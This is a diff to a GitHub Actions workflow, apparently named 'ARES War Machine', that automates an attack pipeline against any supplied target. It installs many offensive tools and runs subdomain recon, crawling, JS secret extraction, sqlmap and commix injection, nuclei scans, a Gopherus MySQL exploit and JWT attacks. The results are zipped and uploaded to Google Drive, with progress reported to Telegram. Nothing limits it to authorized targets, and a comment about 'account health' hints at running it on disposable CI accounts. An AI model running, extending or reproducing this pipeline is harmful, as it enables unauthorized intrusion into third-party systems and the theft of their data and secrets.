@@ -1,11 +1,11 @@
 name: ARES War Machine - Manual Absolute 100%
 on:
-  workflow_dispatch: # Manual trigger only
+  workflow_dispatch: # Manual trigger only to save account health
 
 jobs:
   security-hunt:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: 360 # Full 6-hour execution window
     steps:
       - name: Checkout Repo
         uses: actions/checkout@v4
@@ -14,33 +14,36 @@ jobs:
 
       - name: "Full Global Installation & Environment Setup"
         run: |
-          # 1. SYSTEM & DISPLAY (Fix for Chrome-based tools)
+          # 1. CORE SYSTEM & DISPLAY FIX
           sudo apt-get update
-          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev
-          mkdir -p $HOME/bin $HOME/tools output/
+          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
+          mkdir -p $HOME/bin $HOME/tools output/screenshots/
           echo "$HOME/bin" >> $GITHUB_PATH
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
           # 2. DRIVE API DEPS
           pip3 install google-api-python-client google-auth-httplib2 google-auth-oauthlib
 
-          # 3. INSTALL ALL GO TOOLS
-          go install github.com/OWASP/Amass/v3/...@latest
-          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install github.com/projectdiscovery/katana/cmd/katana@latest
-          go install github.com/lc/gau/v2/cmd/gau@latest
-          go install github.com/jaeles-project/gospider@latest
-          go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
-          go install github.com/hahwul/dalfox/v2@latest
-          go install github.com/ffuf/ffuf@latest
-          go install github.com/projectdiscovery/subjack@latest
-          go install github.com/sensepost/gowitness@latest
-          go install github.com/michenriksen/aquatone@latest
-          go install github.com/tomnomnom/hacks/kxss@latest
-          go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+          # 3. INSTALL ALL GO TOOLS (Sequential for stability)
+          # Amass FIX: Using official lowercase path and binary fallback
+          go install -v github.com/owasp-amass/amass/v4/...@master || (wget https://github.com/owasp-amass/amass/releases/download/v4.2.0/amass_linux_amd64.zip && unzip amass_linux_amd64.zip && mv amass_linux_amd64/amass $HOME/bin/)
+          
+          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
+          go install -v github.com/lc/gau/v2/cmd/gau@latest || true
+          go install -v github.com/jaeles-project/gospider@latest || true
+          go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest || true
+          go install -v github.com/hahwul/dalfox/v2@latest || true
+          go install -v github.com/ffuf/ffuf@latest || true
+          go install -v github.com/projectdiscovery/subjack@latest || true
+          go install -v github.com/sensepost/gowitness@latest || true
+          go install -v github.com/michenriksen/aquatone@latest || true
+          go install -v github.com/tomnomnom/hacks/kxss@latest || true
+          go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest || true
 
           # 4. INSTALL ALL PYTHON/RUBY/TOOL REPOS
+          sudo gem install wpscan || true
           pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap xsstrike openredirex waymore jsluice jwt_tool kiterunner tplmap sstimap ssrfmap corsy crlfsuite smuggler h2csmuggler racetheweb wpscan trivy dumpsterdiver credsweeper detect-secrets eyewitness || true
           
           git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true
@@ -94,43 +97,37 @@ jobs:
           }
 
           # --- STAGE 1: RECON (Domains) ---
-          send_msg "🔍 *Stage 1: Domain Recon*"
+          send_msg "🔍 *Stage 1: Domain Recon* for \`$TARGET\`"
           subfinder -d $TARGET -o output/subs.txt
           amass enum -d $TARGET -o output/amass.txt
           cat output/subs.txt output/amass.txt | sort -u > output/all_subs.txt
           
-          # --- STAGE 2: VISUAL & PROBING (Fix for Chrome Tools) ---
-          send_msg "📷 *Stage 2: Visual Recon (Chrome-based)*"
+          # --- STAGE 2: VISUAL & PROBING (Xvfb Fix) ---
+          send_msg "📷 *Stage 2: Probing & Screenshots*"
           httpx -l output/all_subs.txt -o output/live.txt
-          # Using xvfb-run to prevent Chrome hangs
           xvfb-run gowitness file -f output/live.txt --screenshot-path output/screenshots/ || true
           cat output/live.txt | xvfb-run aquatone -out output/aquatone_report || true
 
-          # --- STAGE 3: CRAWLING & URL ANALYSIS ---
-          send_msg "🕷️ *Stage 3: Deep Crawling & JS Secrets*"
+          # --- STAGE 3: CRAWLING & JS ---
+          send_msg "🕷️ *Stage 3: Deep Crawling & JS Analysis*"
           katana -list output/live.txt -o output/urls.txt
-          # Execution of unused Secret/JS tools
           cat output/urls.txt | jsluice urls > output/js_endpoints.txt || true
           python3 $HOME/tools/SecretFinder/SecretFinder.py -i $TARGET -e -o cli > output/secrets.txt || true
 
-          # --- STAGE 4: EXPLOITATION (Correct URL Feeding) ---
-          send_msg "🧪 *Stage 4: Targeted Exploitation*"
-          # Only feed live URLs to injection tools
+          # --- STAGE 4: EXPLOITATION ---
+          send_msg "🧪 *Stage 4: Targeted Injection & Vulns*"
           sqlmap -m output/urls.txt --batch --random-agent --level 1 --risk 1 --output-dir=output/sqlmap || true
           commix --url-file=output/urls.txt --batch --output-dir=output/commix || true
+          nuclei -l output/live.txt -o output/nuclei_results.txt || true
           
-          # Specialized Injection Tools
-          sstimap -m output/urls.txt --batch > output/ssti.txt || true
-          ssrfmap -l output/urls.txt > output/ssrf.txt || true
-          
-          # STAGE 5: SPECIALIZED TOOLS (Git/JWT/CMS)
+          # STAGE 5: SPECIALIZED TOOLS (Git/JWT/Gopherus)
           send_msg "🕵️ *Stage 5: OSINT & Specialized Hunting*"
           python3 $HOME/tools/GitDorker/GitDorker.py -t $TARGET -q $TARGET -o output/gitdorks.txt || true
           jwt_tool -M pb -t $TARGET > output/jwt_scan.txt || true
           python3 $HOME/tools/Gopherus/gopherus.py --exploit mysql --url $TARGET > output/gopherus.txt || true
 
-          # FINAL ZIP & UPLOAD
-          send_msg "📦 *Syncing all 100% Tools to Drive...*"
+          # FINAL ZIP & SYNC
+          send_msg "📦 *Syncing all tools to Drive...*"
           zip -r "ARES_ABSOLUTE_${TARGET}.zip" output/
           python3 upload_to_drive.py "ARES_ABSOLUTE_${TARGET}.zip" "$FOLDER_ID" "$TARGET"
 
@@ -138,5 +135,6 @@ jobs:
         if: always()
         run: |
           curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" \
-          -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" -d text="✅ **ARES Manual Run Complete.**"
+          -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" -d text="✅ **ARES Manual Run Complete.** Check Drive."
           rm -rf output/ *.zip
+          
